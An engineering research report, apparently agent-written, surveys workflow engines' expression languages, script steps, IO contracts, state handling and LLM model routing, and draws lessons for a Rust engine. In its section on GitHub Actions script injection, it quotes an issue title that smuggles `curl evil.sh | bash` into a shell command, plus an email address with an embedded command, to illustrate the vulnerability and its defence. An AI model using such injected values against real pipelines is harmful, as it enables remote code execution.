<!-- Ingested research: immutable per docs-layout sources discipline.
     Produced 2026-08-15 by a web-research agent for RDMP-260815-2009-01;
     original at scratchpad/prior-art-research.md (session-ephemeral). -->

# Prior Art Research — Workflow Engine Design Patterns for SilverBond

Research date 2026-08-15. Surveyed: GitHub Actions, Argo Workflows, Temporal, n8n, Airflow, Prefect, plus the CEL / JSONLogic / jq / JMESPath ecosystems and LLM orchestration tools (LangGraph, CrewAI, Dify, Flowise, LiteLLM).

SilverBond context assumed throughout: Rust engine, node/edge graph, LLM CLIs + shell steps in tmux panes, per-execution **string-only** variables, `{{var:X}}` / `{{node:ID.parsedOutput.a.b}}` templating, edge conditions as structured `{field, operator, value}` over parsed JSON, subflows.

---

## 1. Condition / expression languages for branching

| Engine | Language | Missing-field behaviour | Typing | Notable pain |
|---|---|---|---|---|
| GitHub Actions | Proprietary `${{ }}` | Silently `null` → coerces to `0`/`''` | Untyped, **loose** coercion | `'false'` is truthy; `&&`/`||` return operands |
| Argo `when:` | `govaluate` (abandoned) applied **after** `{{ }}` text substitution | Substitution failure = template error | Untyped string-splice | Quotes in a value break the expression |
| Argo `depends:` / events | `expr-lang` via `{{=...}}` | `?.` / `??` nil-safe | Dynamic | Different dialect from `when:` in the same product |
| Temporal | Host language `if` | Language-native | **Statically typed** | Determinism constraint; no declarative surface |
| n8n | JS in `{{ }}` | `undefined` propagates | JS coercion | Editor preview ≠ runtime |
| Kubernetes (CEL) | CEL | **Hard error** unless `has()` / `?.` | **Type-checked at CRD create time** | Cost-budget rejections; `__dot__` escaping |
| JSONLogic | JSON-as-AST | `var` on missing → `null` (falsy) | Untyped | Deliberately tiny; verbose to hand-author |
| jq / JMESPath | Query languages | `null` (falsy) | Untyped | jq is a whole functional language; JMESPath has no arithmetic |

**GH Actions — untyped coercion is the root of the most-reported footgun.** The docs publish an explicit casting table: `null → 0`, `false → 0`, `true → 1`, string "parsed from any legal JSON number format, otherwise `NaN`", arrays/objects → `NaN`, and any relational comparison involving `NaN` is `false` ([expressions reference](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions)). Because `workflow_dispatch` inputs arrive as **strings**, `if: github.event.inputs.deploy` with value `"false"` is a non-empty string and therefore **truthy** — the step runs ([community #9343](https://github.com/orgs/community/discussions/9343), [actions/runner#1483](https://github.com/actions/runner/issues/1483)). The same input is a real boolean under `workflow_call`, so *the identical expression behaves differently depending on how the workflow was invoked*. Separately, `&&`/`||` **return operands, not booleans**, so the ternary idiom `${{ c && 'a' || 'b' }}` breaks whenever `'a'` is falsy ([7tonshark](https://7tonshark.com/posts/github-actions-ternary-operator/)); and literal text leaking outside `${{ }}` in an `if:` turns the condition into a truthy string so the step always runs ([OpsCanopy](https://opscanopy.com/blog/github-actions-if-condition-always-true/)).

**Argo — substituting values into expression *source text* before parsing is the original sin.** Argo's own docs warn: *"If the parameter value contains quotes, it may invalidate the govaluate expression. To handle parameters with quotes, embed an expr expression in the conditional"* — i.e. `when: "{{=inputs.parameters['may-contain-quotes'] == 'example'}}"` ([conditionals walk-through](https://argo-workflows.readthedocs.io/en/latest/walk-through/conditionals/)). This is the shell-injection shape transplanted into an expression evaluator. Argo also ships **three expression dialects** — `fasttemplate` for `{{ }}`, `govaluate` for `when:`, `expr` for `depends:` and events — producing *"We're very inconsistent with the expression environment we use for evaluation"* ([#5142](https://github.com/argoproj/argo-workflows/issues/5142), closed as superseded), [#7089 "should be the same across all places it is used"](https://github.com/argoproj/argo-workflows/issues/7089), and the nastiest one: `when:` *accidentally* accepts `expr` when the substituted result happens to be valid `govaluate`, so a wrong-dialect expression silently **works** and only errors when templating fails ([#7576](https://github.com/argoproj/argo-workflows/issues/7576)).

**CEL — strictness is the feature, and it is the opposite of every engine above.** A missing map key is a **runtime error**, not `null`; the spec calls it `no_such_field` while the conformance suite expects `"no such key"`, a decade-old inconsistency ([cel-spec#65](https://github.com/google/cel-spec/issues/65)). Guarding needs `has(x.y)` or `x.?y.orValue(d)` — and even `?.` on `null` was changed to error rather than fall through ([cel-go#937](https://github.com/google/cel-go/issues/937)). For SilverBond: a CEL edge condition on an LLM node whose JSON omitted the expected key would **fail evaluation**, not take the false branch.

**Kubernetes is CEL's strongest proof point and added two things beyond the language.** (1) **Type-checking at admission time** — `x-kubernetes-validations` rules are checked against the OpenAPI schema when the CRD is *created*. (2) A **cost budget** — a static "estimated cost" analysis rejects expressions whose worst case is too expensive, plus a runtime budget per request ([k8s CEL reference](https://kubernetes.io/docs/reference/using-api/cel/), [CRD validation beta post](https://kubernetes.io/blog/2022/09/23/crd-validation-rules-beta/)); the cost model has real friction ([#121162](https://github.com/kubernetes/kubernetes/issues/121162), [#126239](https://github.com/kubernetes/kubernetes/issues/126239)) but the principle holds. K8s also needed an **escaping scheme** (`__dot__`, `__slash__`) because CEL identifiers can't express arbitrary property names ([#118230](https://github.com/kubernetes/kubernetes/issues/118230)) — directly relevant since SilverBond's `parsedOutput` holds arbitrary LLM-produced JSON keys.

### 1.1 CEL's Rust story (specifically requested)

Better than its reputation — **but the crate was renamed and the old name is what people find.**

| Crate | Latest | Status | Signal |
|---|---|---|---|
| **`cel`** | **0.14.3, updated 2026-08-15** | **Active — the live crate** | ~895k total / **~667k recent** downloads |
| `cel-interpreter` | 0.10.0, 2025-07-23 | **Superseded** (same repo, renamed) | ~482k total; don't start here |
| `common-expression-language` | 0.1.0 | lib.rs marks "[minimal maintenance]" | Avoid |

Lineage: `cel-interpreter` 0.1–0.2 by Tom Forbes (`orf/cel-rust`) → Clark McCauley from 0.3.0 (Jul 2023) → moved to the `cel-rust` org, crate renamed `cel` ([crates.io/cel](https://crates.io/crates/cel), [repo](https://github.com/cel-rust/cel-rust)). Health: 657 stars, 584 commits, ~18 open issues / 14 PRs, roughly quarterly releases, and a **FOSDEM 2026 Rust devroom talk** by Alex Snaps on the state of the Rust port ([FOSDEM 2026](https://fosdem.org/2026/schedule/event/DBGZAU-rust-cel/)) — not abandonware.

**Gaps to budget for:** docs.rs reports only **~21% of the crate documented** ([docs.rs](https://docs.rs/cel-interpreter/latest/cel_interpreter/)); **no advertised conformance percentage** against [cel-spec](https://github.com/google/cel-spec/issues/156); open issues show a macro regression with mutable accumulators (#247), no custom `MacroExpander` hook (#276), awkward heterogeneous maps (#244), and **a full clone on every custom-function accessor over a large map/list** (#303) — that last one bites if a large `parsedOutput` is bound into the context on every edge evaluation ([issues](https://github.com/cel-rust/cel-rust/issues)). **Critically there is no separate Rust type-checker** — you get `Program::compile` + a `Context`. Kubernetes-style save-time schema validation would have to be built, and SilverBond has no schema for `parsedOutput` anyway.

**Realistic Rust alternatives:**

| Crate | Latest | Downloads | Verdict |
|---|---|---|---|
| `cel` | 0.14.3 (2026-08-15) | ~667k recent | Most capable; Google-spec lineage; strict error semantics |
| [`expr-lang`](https://crates.io/crates/expr-lang) (jdx/expr.rs) | 1.1.1 (2026-02-10) | ~57k recent | Port of Argo's `expr`; nil-safe `?.`/`??`; **young** (first release Nov 2024, ~2.7k LOC) |
| [`jaq-core`](https://crates.io/crates/jaq-core) | active | ~2.8M total | jq semantics, thread-safe, embeddable — but far past "edge condition" |
| [`jsonlogic-rs`](https://crates.io/crates/jsonlogic-rs) | — | modest | Claims **100% of standard JSONLogic ops**; rules are JSON so they round-trip through SilverBond's schema for free |
| [`jmespath.rs`](https://github.com/jmespath/jmespath.rs) | — | — | **Effectively unmaintained** — avoid |
| [`evalexpr`](https://github.com/ISibboI/evalexpr) | 13.x | active | Small, no deps, but bespoke semantics with no spec to lean on |

Note the design axis: **JSONLogic is JSON-as-AST** — *"We never `eval()`. Rules only have read access to data you provide, and no write access to anything"*, no loops/functions/side effects, and rules serialize to JSON so they live in a database and are shared between frontend and backend ([jsonlogic.com](https://jsonlogic.com/)). That is structurally the generalisation of SilverBond's existing `{field, operator, value}`. By contrast JMESPath is "deliberately limited — no arithmetic, no user-defined functions" while jq is "not really a query language but a small functional programming language" ([comparison](https://appcrib.com/blog/jq-vs-jsonpath-vs-jmespath-query-languages/)).

### Lessons for SilverBond — expressions

1. **Never build a condition by substituting values into expression source text.** Argo's docs admit quotes in a parameter invalidate the `when:` expression ([argo](https://argo-workflows.readthedocs.io/en/latest/walk-through/conditionals/)). Bind values into an evaluation *context*. SilverBond's `{field, operator, value}` already does this correctly — any move to a string language must preserve it.
2. **Decide missing-field semantics explicitly and surface it in the UI.** CEL errors ([cel-spec#65](https://github.com/google/cel-spec/issues/65)); everyone else returns falsy. For LLM output — where a key is missing *because the model didn't emit it* — silent-falsy hides prompt regressions. A third state (`missing` → dedicated edge) is offered by none of the surveyed engines; that's an opportunity, not a warning.
3. **String-only variables + loose coercion is the single most-reported footgun in this survey.** `"false"` being truthy has its own multi-year issue ([actions/runner#1483](https://github.com/actions/runner/issues/1483)). Make operators *explicitly typed* (`equals_string`, `equals_number`, `is_true`) rather than inferring — inference is where every engine bleeds.
4. **One dialect, everywhere.** Argo shipped three and earned [#5142](https://github.com/argoproj/argo-workflows/issues/5142), [#7089](https://github.com/argoproj/argo-workflows/issues/7089) and [#7576](https://github.com/argoproj/argo-workflows/issues/7576) — including a case where the wrong dialect silently works.
5. **Validate at save time and bound evaluation cost.** Kubernetes type-checks at CRD creation and rejects statically-expensive expressions ([k8s](https://kubernetes.io/docs/reference/using-api/cel/)). SilverBond can't type-check `parsedOutput`, but it can parse-check on save and cap evaluation.
6. **Preview must equal runtime.** n8n's editor routinely shows `[undefined]` / "Can't get data for expression" for expressions that work at runtime and vice-versa ([n8n#15890](https://github.com/n8n-io/n8n/issues/15890), [community](https://community.n8n.io/t/error-can-t-get-data-for-expression-on-set-node-variable-preview-when-connected-to-both-ends-of-if-node/26495)). Any inspector preview must run the identical evaluator over a recorded `parsedOutput`.
7. **Temporal's code-native branching isn't available to you, and that's fine.** Its pitch is "no forced DSLs, DAGs, YAML", paid for with a determinism constraint: workflow code cannot branch on wall-clock time, randomness or mutable global state without breaking replay ([Temporal](https://docs.temporal.io/workflow-definition)). The borrowable part is only the *typed signature* idea (§3).

---

## 2. Script-step design

| Engine | How inputs arrive | How outputs return | Injection posture |
|---|---|---|---|
| **GH Actions `run:`** | `${{ }}` **textually spliced into the generated shell script** before execution | `::set-output` on stdout (deprecated) → `$GITHUB_OUTPUT` **file path via env var** | Direct interpolation is exploitable; official fix is `env:` indirection + file-based output |
| **Argo `script:`** | `{{inputs.parameters.x}}` textually substituted into `source:` by the controller | implicit `outputs.result` = raw stdout; explicit `outputs.parameters[].valueFrom.path` reads a **file** | Same splice architecture, fewer guardrails; escaping bugs open for years |
| **n8n Code node** | Objects **passed by reference / IPC** — `$json`, `$input.all()`; code is never templated | `return` value / item array — no stdout parsing at all | No injection-into-source risk; a *sandbox-escape* risk instead |
| **Airflow PythonOperator** | `op_args`/`op_kwargs` as real Python objects; `templates_dict` optionally Jinja-rendered | return value auto-pushed to XCom (DB-backed) | No shell surface; DB-size + serialization pitfalls instead |

**The canonical injection story.** GH Actions evaluates `${{ }}` and writes the result into a temp shell script *before the shell parses it*, so `run: title="${{ github.event.issue.title }}"` with an issue titled ``a"; `curl evil.sh | bash` #`` is arbitrary code execution ([GitHub Security Lab, Part 2: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/)). The untrusted surface is large: PR/issue titles and bodies, comments, reviews, branch names, labels, commit messages, and even email addresses — ``  `echo${IFS}hello`@domain.com `` is a valid address. The official mitigation is **env-var indirection**:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ "$TITLE" =~ ^octocat ]]; then ...
```

It works because the runner binds the value to a real OS environment variable *before* the script text is assembled, so a hostile payload is data at that boundary and `"$TITLE"` is a single quoted expansion the shell never re-parses as code ([GH security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)). Templating-into-source is structurally the same bug class as string-built SQL.

**Argo proves the escaping problems are durable, not teething.** Same textual-substitution architecture, with open issues spanning 2017–2024: newlines in a substituted value break the controller's own JSON unmarshal (`invalid character '\n' in string literal`, [#212](https://github.com/argoproj/argo-workflows/issues/212)); whitespace inside the braces (`{{ x }}` vs `{{x}}`) silently fails to interpolate ([#4484](https://github.com/argoproj/argo-workflows/issues/4484)); double quotes aren't escaped correctly when serializing `workflow.parameters.json` ([#11131](https://github.com/argoproj/argo-workflows/issues/11131)).

**Output channels: stdout-sentinel scraping is a solved-and-abandoned design.** GH Actions killed `::set-output name=x::v` precisely because the runner parsed **stdout** for `::command::` sentinels, so anything a script echoed — including untrusted content printed for debugging — could **forge** outputs and env vars ([deprecation changelog](https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/)). The replacement writes to a file path handed to the process out-of-band: `echo "k=v" >> "$GITHUB_OUTPUT"`. That is the same trust-boundary move as the `env:` fix: get off a channel the untrusted payload can also write to. **The multiline heredoc form inherits the problem** — a fixed delimiter (`EOF`) is itself injectable, since content containing a bare `EOF` line closes the heredoc early and the remainder is interpreted as further `key=value` lines. The community fix is a **random per-invocation delimiter** (UUID) or single-line JSON encoding ([jstrieb](https://jstrieb.github.io/posts/github-actions-multiline-outputs/), [community #116619](https://github.com/orgs/community/discussions/116619)).

**Sandboxing: process isolation beat language sandboxing.** n8n ran the Code node on their hardened `@n8n/vm2` fork in-process; upstream vm2 was discontinued after unpatched sandbox-escape CVEs, and n8n moved to `isolated-vm` and then restructured so Code execution happens in a **separate task-runner process** — "task runners are the only isolation layer between user-provided code and n8n, and without them, anyone who can edit a workflow could potentially read your database, encryption key, stored credentials, and environment variables" ([task runners](https://deepwiki.com/n8n-io/n8n/7.4-task-runners-and-sandboxed-execution), [@n8n/vm2](https://www.npmjs.com/package/@n8n/vm2)).

**Structured stdout conventions.** Two dominant patterns: a single JSON blob on stdout with all logs on stderr (the `jc`/`--output-format json` convention, [jc](https://kellyjonbrazil.github.io/jc/)), and JSON Lines for streams of events. The informal "last line that parses as JSON" rule is fragile — an upstream log line can coincidentally look like JSON, and multi-line JSON breaks it outright.

### Lessons for SilverBond — script steps

1. **Never string-concatenate `{{var:X}}` / `{{node:...}}` into a shell command.** Pass them as env vars (`SB_VAR_X`) the script references as `"$SB_VAR_X"` ([GH Security Lab](https://securitylab.github.com/resources/github-actions-untrusted-input/)).
2. **Treat LLM `parsedOutput` as untrusted, always.** It is attacker-influenceable the moment the LLM reads any external content (issue bodies, web pages, tool results) — the same threat model as `github.event.*` ([GH hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)).
3. **Never parse stdout for control sentinels the script can also write.** That is exactly why `::set-output` died ([changelog](https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/)). This is sharpest for SilverBond because tmux pane scrollback mixes human logs and machine output on one channel by construction.
4. **If a delimiter convention is unavoidable, randomise it per execution.** A fixed `<<<SB_OUTPUT>>>` is injectable by any LLM that echoes that literal ([jstrieb](https://jstrieb.github.io/posts/github-actions-multiline-outputs/)).
5. **Prefer a dedicated output file to stdout scraping** — Argo's `valueFrom.path` and GHA's `$GITHUB_OUTPUT` independently converged on it ([Argo output params](https://argo-workflows.readthedocs.io/en/latest/walk-through/output-parameters/)).
6. **A tmux pane is an execution boundary, not a security boundary.** Same OS user, same filesystem, same credentials as the engine. n8n's vm2 → task-runner migration is the precedent for being explicit about what is and isn't protected ([n8n](https://deepwiki.com/n8n-io/n8n/7.4-task-runners-and-sandboxed-execution)).
7. **Separate "did it succeed" (exit code) from "what did it produce" (output channel).** All three engines keep these orthogonal; inferring success from output parseability is an anti-pattern.
8. **Cap output size at capture with a loud engine-level error.** Airflow has no engine-level XCom cap — the real ceiling is silently inherited from the DB backend (MySQL 64KB vs Postgres ~1GB), which surfaces as an opaque error far from the author's mental model ([Astronomer](https://www.astronomer.io/docs/learn/airflow-passing-data-between-tasks)).
9. **Beware auto-type-coercion in templating.** Airflow's native-Jinja mode silently renders the string `"42"` as int `42`. If `{{node:...parsedOutput.a.b}}` ever auto-detects JSON types instead of substituting as string, document and guard the surprise.

---

## 3. Step / workflow IO contracts

| Engine | Input typing | Required/default | Output typing | When validated | Notable gaps |
|---|---|---|---|---|---|
| **GH reusable workflow** (`workflow_call`) | `type:` = string \| boolean \| number **only** | `required:`, `default:` (`false`/`0`/`""`) | job-output passthrough | **Parse time**, pre-run | No object/array types; 10-level nesting cap; matrix outputs collide; secrets propagate one hop |
| **GH composite action** | **string only** — no `type:` keyword | `required:`, `default:` | `value: ${{ steps.x.outputs.y }}` | Structure at parse time; values opaque | No typing at all — booleans are `'true'`/`'false'` strings |
| **Argo** | `parameters` = untyped **string** (+ `enum` picklist); `artifacts` = blobs | `default`, `enum`, `valueFrom` | `outputs.parameters` (string), `outputs.artifacts` | `argo lint` client-side; **no default admission webhook** | No native number/bool/object params; invalid specs admitted, fail at reconcile |
| **Temporal** | Native language types + Data Converter | Language defaults | Native return types | **Compile time** + replay determinism | 2 MB payload / 4 MB gRPC caps; signature change breaks replay |
| **Prefect** | Python type hints / full Pydantic models | Python + `Field` defaults | Return hints (weak) | **At flow-run submission** (coerce + validate) | Pydantic v2 generics regressions; defaults stripped when JSON equals default |
| **n8n sub-workflow** | Callee-defined: typed fields / JSON-example / "accept all" | Per-field required flag | No formal output schema | Design time + best-effort at run | Caller caches a stale schema vs callee changes |

**GH Actions.** `type:` is required on `workflow_call` inputs and limited to exactly three scalars — `choice` exists only for `workflow_dispatch`. Defaults when unset: `false` / `0` / `""`. Outputs are two-hop: step → job → workflow (`value: ${{ jobs.<id>.outputs.<name> }}`). Validation is **static, at parse time** — "this string is validated when the workflow is parsed, before any jobs are run" — which is why passing an `${{ }}` expression (always a string) into a `type: boolean` input yields `Unexpected type of value 'false', expected type: Boolean` ([reuse-workflows docs](https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows), [actions/runner#2848](https://github.com/actions/runner/issues/2848)). Limits: max **ten levels** of nested workflows, no loops in the call tree; `secrets: inherit` propagates **one hop only**, so in A→B→C, C only gets what B explicitly re-passed ([changelog](https://github.blog/changelog/2022-05-03-github-actions-simplify-using-secrets-with-reusable-workflows/)); and **matrix job outputs collide** — every leg writes the same job-output key, "the last matrix job to finish wins, and the run order is not guaranteed" ([community #17245](https://github.com/orgs/community/discussions/17245)), forcing third-party artifact-staging actions like [cloudposse/github-action-matrix-outputs-write](https://github.com/cloudposse/github-action-matrix-outputs-write). Composite actions have **no `type:` at all** — every input is a string.

**Argo.** Parameters are strings everywhere; `enum:` is the only "typing", rendered as a UI dropdown ([parameters walk-through](https://argo-workflows.readthedocs.io/en/latest/walk-through/parameters/), [workflow-inputs](https://argo-workflows.readthedocs.io/en/latest/workflow-inputs/)). The important structural gap: validation is client-side via `argo lint`, and there is **no validating admission webhook by default**, so "there are various scenarios where an invalid Workflow will be allowed in the cluster, causing bugs to be found much later instead of upfront" ([#13503](https://github.com/argoproj/argo-workflows/issues/13503)). Global-param resolution across `WorkflowTemplate` boundaries has its own long-standing rough edge ([#9711](https://github.com/argoproj/argo-workflows/issues/9711)) — a direct warning for SilverBond subflows.

**Temporal.** Typing is the host compiler; the interesting constraint is that changing a signature or a branch **breaks replay**: "the server side Event History would be out of sync... this would cause the Workflow to fail with a nondeterminism error", fixed only by explicit `GetVersion()` branching that "records a marker in the Event History" so old executions replay the old branch ([versioning](https://docs.temporal.io/develop/go/workflows/versioning)). Payloads cap at **2 MB** each with a **4 MB gRPC request** ceiling that can blow even when each payload is legal ([blob-size-limit](https://docs.temporal.io/troubleshooting/blob-size-limit-error)); the sanctioned fix is the claim-check pattern — store the blob, pass a reference.

**Prefect** coerces at submission: "Prefect will attempt to coerce provided parameters to the parameter schema implied by your flow function's type signature" ([flows](https://docs.prefect.io/v3/concepts/flows)) — with known bugs where defaults get silently stripped when submitted JSON exactly equals the model default ([prefect#10781](https://github.com/PrefectHQ/prefect/issues/10781)).

**n8n** is the closest analogue to SilverBond subflows: the *callee* declares the contract on its "Execute Sub-workflow Trigger" node — "Define using fields below" (named+typed, auto-rendered as a form on the caller), "Define using JSON example" (infer from a sample), or "Accept all data" (no contract). The caller caches the schema and doesn't always refresh when the callee changes it ([docs](https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.executeworkflowtrigger), [n8n#14648](https://github.com/n8n-io/n8n/issues/14648)).

### Lessons for SilverBond — IO contracts

1. **Declare the subflow contract on the callee and render the caller form from it.** n8n's three-mode design (typed fields / JSON example / accept-all) is a good ladder, but **invalidate the caller's cached schema on callee change** — that's a live bug there ([n8n#14648](https://github.com/n8n-io/n8n/issues/14648)).
2. **Validate at save time, not only at run time.** GH Actions rejects type mismatches at parse ([docs](https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows)); Argo doesn't, and openly regrets it ([#13503](https://github.com/argoproj/argo-workflows/issues/13503)). Given "backend is authoritative for validation" is already a SilverBond tenet, save-time subflow-arity checking is the cheap, high-value version.
3. **Even a three-scalar type system beats none.** GH composite actions have zero typing and force `== 'true'` comparisons everywhere; `workflow_call` has three types and catches real errors before any job runs. A `string | number | boolean | enum` set on subflow inputs is the minimum worth having — with `enum` earning its keep as a UI dropdown, as in Argo.
4. **Cap nesting depth and forbid cycles explicitly.** GH caps at ten levels and disallows loops in the call tree; without a cap, subflow recursion is an unbounded-resource bug waiting to happen.
5. **Decide secret/variable propagation depth deliberately.** `secrets: inherit` propagating exactly one hop is confusing but *safe by default* ([changelog](https://github.blog/changelog/2022-05-03-github-actions-simplify-using-secrets-with-reusable-workflows/)); whichever SilverBond picks for variable scope across subflows, it must be documented, not emergent.
6. **Size-cap values at the boundary and use claim-check for anything large.** Temporal's explicit 2 MB/4 MB limits with a documented offload pattern ([blob-size](https://docs.temporal.io/troubleshooting/blob-size-limit-error)) is the model; Airflow's silently-DB-inherited limit is the anti-model.

---

## 4. Mutable run state across iterations

| Engine | Mechanism | Persistence | Known pitfalls |
|---|---|---|---|
| **Argo** | `withItems` / `withParam` fan-out; results aggregate into a **JSON array** | Per workflow | Every iteration's output "must be valid JSON"; named params come back as **escaped strings, not parsed objects** |
| **Temporal** | Ordinary local variables in workflow code | Replayed from event history | History capped **51,200 events / 50 MB** (warn at 10,240 / 10 MB); requires Continue-As-New |
| **n8n** | `$getWorkflowStaticData()` | **Production runs only** | Silent dev/prod divergence; failed runs may not persist; last-writer-wins races |
| **GH Actions** | *None by design* — outputs write-once, `$GITHUB_ENV` for env | Per job | No loops at all (matrix is parallel fan-out); `::set-env` was an injection hole |
| **Airflow** | XCom (per-task-instance) vs Variables (global) | Metadata DB | "Only designed for small amounts of data"; limits inherited from the DB backend |

**Argo's aggregation is JSON-array-of-strings under the hood, and it leaks.** "The output of all iterations can be accessed as a JSON array, once the loop is done" and "the output of each iteration **must** be a valid JSON" ([loops](https://argo-workflows.readthedocs.io/en/latest/walk-through/loops/)) — in practice producing parse errors when values aren't strictly valid JSON ([#10775](https://github.com/argoproj/argo-workflows/issues/10775)), named output parameters returning **escaped strings rather than parsed objects** ([#12812](https://github.com/argoproj/argo-workflows/issues/12812)), and `.outputs.result` vs named `outputs.parameters` aggregating **inconsistently** in nested fan-out ([#13510](https://github.com/argoproj/argo-workflows/issues/13510)).

**Temporal shows why unbounded accumulated state is structurally fatal.** Every replay re-executes the entire history from event 1 — there is no incremental replay — so history size directly drives replay time and memory. Hence the hard caps and the mandated **Continue-As-New** pattern, which completes the current execution and atomically starts a fresh one carrying only explicitly-passed state; guidance is to check `GetCurrentHistoryLength()` and continue at "typically between 2,000 and 5,000 events" ([continue-as-new](https://docs.temporal.io/design-patterns/continue-as-new), [limits](https://docs.temporal.io/workflow-execution/limits)).

**n8n static data is the cautionary tale for a mutable per-execution store.** It "isn't available when testing workflows" — manual/editor runs don't persist, so a developer sees it "work" while nothing is saved; persistence is opportunistic at successful end-of-run, so failed executions may lose updates ([docs](https://docs.n8n.io/build/code-in-n8n/cookbook/built-in-methods-and-variables-examples/getworkflowstaticdata), [n8n#17321](https://github.com/n8n-io/n8n/issues/17321)); and because the save happens at end-of-run, concurrent executions race on the same blob with last-writer-wins and no locking.

**GH Actions has no mutable cross-step state on purpose** — outputs are write-once and flow strictly downstream through the DAG. `$GITHUB_ENV` is the nearest thing and carries the `::set-env` injection history; current guidance is "never write untrusted input data to the environment file... prefer Action output parameters instead of environment variables" ([Ken Muse](https://www.kenmuse.com/blog/github-actions-injection-attacks/), [OpenSSF](https://openssf.org/blog/2024/08/12/mitigating-attack-vectors-in-github-workflows/)). The matrix-output collision in §3 is the direct symptom of parallel legs with no shared mutable scope.

**String-only variable store pitfalls — concrete evidence:**

| Pitfall | Evidence |
|---|---|
| Declared-boolean input is a string at read time | `github.event.inputs.<bool>` is always `'true'`/`'false'`, so `if: ${{ ... }}` is always truthy ([community #29796](https://github.com/orgs/community/discussions/29796), [Varun Barad](https://varunbarad.com/blog/github-actions-input-types)) |
| Typed input vs untyped caller expression | `Unexpected type of value 'false', expected type: Boolean` unless wrapped in `fromJSON()` ([actions/runner#2848](https://github.com/actions/runner/issues/2848)) |
| YAML's own coercion (the "Norway problem") | YAML 1.1 turns `no`/`NO`/`off`/`on`/`yes` into booleans, so country code `NO` becomes `false`; 1.2 narrowed it but "popular libraries like PyYAML and LibYAML still haven't adopted v1.2" ([bram.us](https://www.bram.us/2022/01/11/yaml-the-norway-problem/), [strictyaml#186](https://github.com/crdoconnor/strictyaml/issues/186)) |
| Ansible implicit string→bool | "Ansible converts strings 'yes' and 'no' into booleans... when it is not asked to"; truthy set is `True,'yes','on','1','true',1` ([ansible#11905](https://github.com/ansible/ansible/issues/11905)) |
| Terraform conditional coercion | `"true"` → `true` is applied when passing into a typed variable but **not** for the `==` operator, so `var.x == true` and `var.x == "true"` differ by provenance ([Terraform types](https://developer.hashicorp.com/terraform/language/expressions/types)) |
| Airflow native-Jinja | Templated `"42"` silently renders as int `42` under `render_template_as_native_obj` |

### Lessons for SilverBond — mutable state

1. **String-only is survivable only with explicitly typed comparison operators.** Every engine that coerces implicitly has a famous bug for it (rows above). Keep the store stringly if you like — make the *operators* carry the type.
2. **Bound accumulation and say so.** Temporal caps history and mandates Continue-As-New ([docs](https://docs.temporal.io/design-patterns/continue-as-new)); Airflow inherits an invisible DB limit and users hit it as an opaque error. Pick an explicit per-variable and per-execution byte cap and fail loudly at write time.
3. **Never let dev-mode and prod-mode persistence differ.** n8n's static data persisting only on production runs produces silent dev/prod divergence ([docs](https://docs.n8n.io/build/code-in-n8n/cookbook/built-in-methods-and-variables-examples/getworkflowstaticdata)).
4. **Define write semantics under concurrency before shipping loops.** n8n has last-writer-wins with no locking ([n8n#17321](https://github.com/n8n-io/n8n/issues/17321)); GH Actions matrix legs collide on the same output key ([community #17245](https://github.com/orgs/community/discussions/17245)). If two SilverBond nodes can run concurrently in tmux panes and both write `{{var:X}}`, the semantics must be chosen (last-write-wins / append / error), not discovered.
5. **If you aggregate loop results, return parsed structure, not escaped strings.** Argo's aggregation returning escaped JSON strings that callers must re-parse is a recurring complaint ([#12812](https://github.com/argoproj/argo-workflows/issues/12812), [#13510](https://github.com/argoproj/argo-workflows/issues/13510)) — and it is exactly the shape a string-only store pushes you into.
6. **Write-once-per-node outputs are worth keeping alongside mutable variables.** GH Actions' immutable step outputs make provenance trivially auditable; SilverBond already has this in `{{node:ID.parsedOutput...}}`. Mutable `{{var:X}}` should be the escape hatch, not the default path.

---

## 5. Per-run model / profile routing in LLM orchestration

| Tool | Where model is set | Varies per run? | Indirection | Notes |
|---|---|---|---|---|
| LangChain `init_chat_model` | `model=` at construction, or deferred | Yes, **if declared** via `configurable_fields` | `config={"configurable": {...}}` + `config_prefix` | Docs flag `configurable_fields='any'` as a risk |
| LangGraph `Runtime` | Typed dataclass (`context_schema`) | Yes — `context=` per `.invoke()` | Typed DI object, not a named profile | Replaced the untyped `config.configurable` dict ([#5023](https://github.com/langchain-ai/langgraph/issues/5023)) |
| CrewAI | `llm=` per `Agent` | Fixed at construction | None — raw strings over LiteLLM | No run-scoped override |
| **Dify** | Dropdown on the LLM node | **No — explicitly declined** | None | [#13298 "Dynamically choose model for LLM node" → closed, not planned](https://github.com/langgenius/dify/issues/13298) |
| **Flowise** | Per-node design time, **overridable per API call** | **Yes**, allow-listed | `overrideConfig`, keyable **by nodeId** | Closest existing precedent |
| **LiteLLM Router** | `model_list`: `model_name` alias → `litellm_params.model` | Yes — caller names the alias | **Named alias → deployment pool** | Textbook profile indirection; alias→alias fallbacks |
| OpenRouter | Model string per request, or `openrouter/auto` | Yes | Two axes: which model, which provider | Degrades to a default model set if routing infra is down |
| n8n | Dropdown per Chat Model sub-node; plus a **Model Selector** node | Partially | Visual `switch` over pre-wired models | Sub-nodes resolve expressions against only the **first** input item |
| Langfuse | Prompt *version's* `config` JSON | Yes, by promoting a version/label | Config bundled with versioned prompt | Different axis: content + model versioned together |

### Lessons for SilverBond — model routing

1. **The demand is proven and the incumbents mostly don't serve it.** Dify received a well-argued request for variable-driven model/temperature selection and **closed it as not planned** ([dify#13298](https://github.com/langgenius/dify/issues/13298)); CrewAI has no run-scoped override ([docs](https://docs.crewai.com/en/concepts/agents)). Genuine differentiator — and a signal that retrofitting it is hard, so design it in.
2. **Prefer a named-profile indirection over raw model strings on nodes.** LiteLLM's alias → deployment split lets ops repoint `"fast"` or `"reasoning"` without touching call sites, and supports alias→alias fallback chains ([routing](https://docs.litellm.ai/docs/routing), [fallbacks](https://docs.litellm.ai/docs/proxy/reliability)). SilverBond's per-execution string variables are a natural carrier for a *profile name*, not a literal model id.
